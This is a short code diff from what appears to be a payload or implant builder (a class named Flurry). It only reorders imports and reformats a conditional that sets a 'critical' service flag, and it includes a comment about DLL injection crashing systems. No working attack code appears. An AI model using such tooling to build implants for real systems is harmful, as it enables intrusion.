@@ -21,14 +21,14 @@ from datetime import datetime
 from secrets import token_bytes
 from include.util import nes, xor
 from argparse import BooleanOptionalAction
-from os.path import expanduser, expandvars, join
+from os.path import join, expanduser, expandvars
 from include.builder import go_bytes, random_chars
 from include.manager import (
+    Manager,
     is_int,
     is_str,
-    is_file,
     is_date,
-    Manager,
+    is_file,
     str_lower,
     is_str_list,
 )
@@ -262,9 +262,11 @@ class Flurry(object):
             guard=go_bytes(g),
             files_key=go_bytes(d),
             service=cfg["service_name"],
-            critical="true"
-            if cfg["critical"] and not workspace["library"] and cfg["service"]
-            else "false",
+            critical=(
+                "true"
+                if cfg["critical"] and not workspace["library"] and cfg["service"]
+                else "false"
+            ),
             # BUG(dij): Let's NOT set DLL files as critical for now. We can't
             #           control how they /exactly/ handle injection so we don't
             #           want to leave systems crashing.
